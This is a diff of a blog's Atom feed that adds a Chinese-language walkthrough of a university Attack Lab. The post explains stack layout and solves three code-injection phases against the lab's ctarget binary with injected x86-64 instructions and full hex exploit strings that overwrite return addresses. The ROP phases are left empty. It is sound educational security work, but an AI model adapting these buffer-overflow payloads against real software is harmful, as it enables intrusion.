@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://cheesehigh.com/"/>
-  <updated>2017-01-11T13:54:30.000Z</updated>
+  <updated>2017-02-03T04:34:05.000Z</updated>
   <id>http://cheesehigh.com/</id>
   
   <author>
@@ -14,6 +14,80 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Buffer Overflow Attack</title>
+    <link href="http://cheesehigh.com/2017/02/01/attacklab/"/>
+    <id>http://cheesehigh.com/2017/02/01/attacklab/</id>
+    <published>2017-02-01T13:05:41.000Z</published>
+    <updated>2017-02-03T04:34:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>2016Fall虽然只上了两门课，但是课程负担还是蛮大的，所以18600有一个仅当练习不计分数的Attack Lab一直没有时间做。要成为一名合格的白帽，技能树还是得点地全面一些。对于Attack Lab里的两种攻击方式，虽然为了准备Final已经了解了大概，但是纸上得来终觉浅，还是要亲自实战一番。</p>
+<p>缓冲区溢出（Buffer Overflow）是攻击的核心和原理，其本质就是利用臭名昭著的不检查输入字符串长度的gets函数来造成缓冲区溢出，用攻击者精心设计的代码覆盖掉原有内容，从而完成各种形式的攻击。</p>
+<h2 id="Virtual-Address-Space"><a href="#Virtual-Address-Space" class="headerlink" title="Virtual Address Space"></a>Virtual Address Space</h2><p>操作系统的核心抽象之一就是Virtual Address Space（虚拟地址空间）。一般来说，一台计算机只有一个物理内存，那么如何将这一个有限的物理内存资源分配给操作系统中的所有进程呢？答案就是给每一个进程设计一个虚拟地址空间。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/virtualAddress.png" alt="virtual adress space"></p>
+<p>这张来自wikipedia的图比较清楚地展示了进程的虚拟地址空间到物理内存地址空间的映射关系。每个在虚拟内存空间的页块（Virtual Page）会通过一定的机制（内存管理单元MMU或多级页表）转换为物理内存中的物理页块（Physical Page），原有的顺序会被打乱。这种设计最大的好处就是将进程空间看成是一个连续的整体，从而大大简化了程序的编写和运行。这张图只显示了进程指令、数据和栈的部分，实际上整个虚拟地址空间从地址0开始依次为：text, data, run time heap, shared libraries, stack, kernerl。其中，heap就是传说中用于在runtime动态分配内存的堆，向地址高处增长；stack就是每次函数调用所依赖的栈，向地址低处增长。</p>
+<h2 id="Function-Call-On-Stack"><a href="#Function-Call-On-Stack" class="headerlink" title="Function Call On Stack"></a>Function Call On Stack</h2><p>程序调用的相关操作（如存储函数参数，返回地址，本地变量等）都在栈上完成。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/Call_stack_layout.png" alt="stack"></p>
+<p>还是用wikipedia上的图来解释。蓝色部分的函数是DrawSquare，它调用了绿色部分的函数DrawLine。当DrawSquare内部调用DrawLine前，调用的实际参数会被首先压入栈顶。在汇编语言的CALL DrawLine执行完成后，该指令的下一条指令的地址会被当作DrawLine的返回地址压在参数上方。当DrawLine定义本地变量时，它们也会继续压栈。寄存器%rsp始终维护着栈顶地址。试想一下，如果我们可以利用某些办法更改函数的返回地址，那么就可以篡改原有的执行流程，达到我们的攻击目的。</p>
+<h2 id="Code-Injection"><a href="#Code-Injection" class="headerlink" title="Code Injection"></a>Code Injection</h2><p>如果说缓冲区溢出是攻击的基本原理，那么代码注入（Code Injection）就是利用缓冲区溢出来达到执行自定义指令的目的。首先，将事先设计好的字符串作为参数调用gets函数，若字符串不断在栈上堆积以至于覆盖掉栈上原有的内容。如将原本函数的返回地址覆盖为自定义指令的地址，则在函数返回时接下来执行的就不是原来的下一条指令，而是攻击者指定的指令。</p>
+<p>代码注入部分一共有三个关卡，攻击目标都是一个叫做ctarget的可执行程序。</p>
+<h3 id="Phase1"><a href="#Phase1" class="headerlink" title="Phase1"></a>Phase1</h3><p>首先我们来看第一关。第一关是最简单的，并不要求我们注入代码，而仅仅要求利用缓冲区溢出完成篡改返回地址而执行程序中的touch1函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void touch1() &#123;	vlevel = 1; /* Part of validation protocol */	printf(&quot;Touch1!: You called touch1()\n&quot;);	validate(1);	exit(0);&#125;</div></pre></td></tr></table></figure>
+<p>先来看一下ctarget中的缓冲区输入部分的代码，对ctarget进行反汇编。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d ctarget &gt; ctarget.txt</div></pre></td></tr></table></figure>
+<p>找到getbuf函数。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/getbuf.png" alt="getbuf"></p>
+<p>给缓冲区预留的空间是0x38，也就是56个字节。我们的目标就是通过写入缓冲区并覆盖掉原来getbuf的返回地址，将其写为touch1的入口地址，从而完成控制的转移。</p>
+<p>同样在ctarget.txt中找到touch1函数。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/touch1.png" alt="touch1"></p>
+<p>入口地址为0x004017c0。因此，输入的内容包含任意56字节内容（这里设为00）加上8个字节的入口地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 c0 17 40 00</div><div class="line">00 00 00 00</div></pre></td></tr></table></figure>
+<p>注意字节的先后顺序，由于实验机器是little-endian，需要将数量级越小的位数存储在越低的地址上，如0x004017c0从低地址到高地址存储为c0 17 40 00。另外，并不能将这些十六进制字节直接作为输入，需要用Lab提供的hex2raw程序将这些字节用ASCII码转化为字符表示，因为gets读入的是字符串，它将字符的ASCII码存储起来，因此只有以字符的形式输入最终才能以上面的形式保存在栈中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./hex2raw &lt; phase1.txt &gt; phase1_raw.txt</div><div class="line">./ctarget -i phase1_raw.txt</div></pre></td></tr></table></figure>
+<p>这样一来在getbuf函数返回时就跳转到了0x004017c0，成功调用了touch1函数。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase1.png" alt="phase1"></p>
+<h3 id="Phase2"><a href="#Phase2" class="headerlink" title="Phase2"></a>Phase2</h3><p>第二关要求执行并成功验证touch2函数，并在ctarget.txt中找到touch2函数，地址为0x004017ec。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">void touch2(unsigned val)&#123;</div><div class="line">    vlevel = 2;</div><div class="line">    if (val == cookie)&#123;</div><div class="line">        printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);</div><div class="line">        validate(2);</div><div class="line">    &#125; else &#123;</div><div class="line">        printf(&quot;Misfire: You called touch2(0x%.8x)\n&quot;, val);</div><div class="line">        fail(2);</div><div class="line">    &#125;</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://o86az1gay.bkt.clouddn.com/touch2.png" alt="touch2"></p>
+<p>为了完成攻击，需要令传入的无符号整型参数等于cookie。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/cookie.png" alt="cookie"></p>
+<p>因此，这次需要自己编写一段指令来传入值为cookie的参数（x86-64汇编语言中%rdi存储第一个参数），并跳转到touch2的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">MOVQ $0x2486651c,%rdi</div><div class="line">PUSHQ $0x004017ec</div><div class="line">RETQ</div></pre></td></tr></table></figure>
+<p>首先将cookie的十六进制表示存入%rdi中，再将touch2的地址压栈，RETQ则会把touch2的地址当作返回地址。PUSHQ和RETQ的组合能够跳转到自定义的地址。需要注意的是，不能直接使用CALL或JMP加上目的地址来跳转，因为这些指令的目的地址经过了复杂的编码过程，无法简单地直接构造。之后，将汇编指令转化为机器码构造攻击字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -c phase2.s</div><div class="line">objdump -d phase2.o</div></pre></td></tr></table></figure>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase2_asm.png" alt="phase2_asm"></p>
+<p>可以利用缓冲区来存放这些指令，因此需要知道缓冲区的起始地址。利用gdb重跑一遍phase1，可以找到缓冲区的栈顶地址为0x55631248，可以将指令依次从这里往高地址存储。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase_2_rsp.png" alt="phase2_rsp"></p>
+<p>将指令从0x55631248依次向上存储，直到填满56个字节的缓冲区，继续溢出将0x55631248覆盖掉原有的返回地址，就能够跳转并执行我们编写的指令了。因此，构造如下字节，转化为字符串完成攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 1c 65 86 24 68 ec 17</div><div class="line">40 00 c3 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 48 12 63 55</div><div class="line">00 00 00 00</div></pre></td></tr></table></figure>
+<p>写入攻击字符串后，getbuf函数返回后跳转到了0x55631248处执行指令，传入cookie参数，将touch2的地址压栈，返回后跳转到touch2，成功验证。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase2.png" alt="phase2"></p>
+<h3 id="Phase3"><a href="#Phase3" class="headerlink" title="Phase3"></a>Phase3</h3><p>第三关要求执行并成功验证touch3函数。成功的关键在于hexmatch返回1，hexmatch函数做的事情主要是比较传入的sval字符串和cookie是否相同。注意第二关传入的是无符号整型直接进行比较，而这里传入的是存放cookie字符串的首地址，需要找到缓冲区的某个地方将cookie存入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">int hexmatch(unsigned val, char *sval)&#123;</div><div class="line">    char cbuf[110];</div><div class="line">    char *s = cbuf + random() % 100;</div><div class="line">    sprintf(s, &quot;%.8x&quot;, val);</div><div class="line">    return strncmp(sval, s, 9) == 0;</div><div class="line">&#125;</div><div class="line">void touch3(char *sval)&#123;</div><div class="line">    vlevel = 3;</div><div class="line">    if (hexmatch(cookie, sval))&#123;</div><div class="line">        printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);</div><div class="line">        validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">        printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);</div><div class="line">        fail(3);</div><div class="line">    &#125;</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>因此，攻击的思路和第二关类似，自己编写指令写入缓冲区，覆盖返回地址指向自定义的指令。不是将cookie的值直接传入%rdi，而是将cookie放置在缓冲区中的地址传入%rdi。直接修改下面第二关的字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 1c 65 86 24 68 ec 17</div><div class="line">40 00 c3 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 48 12 63 55</div><div class="line">00 00 00 00</div></pre></td></tr></table></figure>
+<p>下面是修改后的字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">48 c7 c7 55 12 63 55 68 c0 18</div><div class="line">40 00 c3 32 34 38 36 36 35 31</div><div class="line">63 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 48 12 63 55</div><div class="line">00 00 00 00</div></pre></td></tr></table></figure>
+<p>由于hexmatch比较的是字符串，需要将cookie（0x2486651c）的每个字符转化为对应的十六进制ASCII码，为32 34 38 36 36 35 31 63。尝试着把它紧跟在指令后面，由于缓冲区栈顶是0x55631248，可以计算出cookie字符串的起始地址是0x55631255，将这个地址替换掉原来的0x2486651c。另外，将touch2的地址0x004017ec替换为0x004018c0。</p>
+<p>需要注意的是hexmatch函数会把许多寄存器的值压入栈中，可能有污染我们写入的字节的风险，实际测试一下可以发现，hexmatch污染到的最低地址为0x55631260。而幸运的是，cookie字符串的最高地址只有0x5563125d，躲过一劫，如果把cookie存高一点就会被污染了。</p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/hexmatch.png" alt="hexmatch"></p>
+<p>因此，写入攻击字符串后，getbuf函数返回后跳转到了0x55631248处执行指令，将cookie字符串地址0x55631255传入参数，将touch3的地址0x004018c0压栈，返回后跳转到touch3，成功验证。 </p>
+<p><img src="http://o86az1gay.bkt.clouddn.com/phase3.png" alt="phase3"></p>
+<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return-Oriented Programming"></a>Return-Oriented Programming</h2><p>ROP部分一共有两个关卡，攻击目标都是一个叫做rtarget的可执行程序。</p>
+<h3 id="Phase4"><a href="#Phase4" class="headerlink" title="Phase4"></a>Phase4</h3><h3 id="Phase5"><a href="#Phase5" class="headerlink" title="Phase5"></a>Phase5</h3><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>要修补缓冲区溢出漏洞，只需要将gets函数替换为fgets函数，该函数能够规定每次读入的字符串长度，从而杜绝了溢出的可能。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;2016Fall虽然只上了两门课，但是课程负担还是蛮大的，所以18600有一个仅当练习不计分数的Attack Lab一直没有时间做。要成为一名合格的白帽，技能树还是得点地全面一些。对于Attack Lab里的两种攻击方式，虽然为了准备Final已经了解了大概，但是纸上得来终
+    
+    </summary>
+    
+      <category term="Tech" scheme="http://cheesehigh.com/categories/Tech/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>《黑客与画家》 Reading Notes</title>
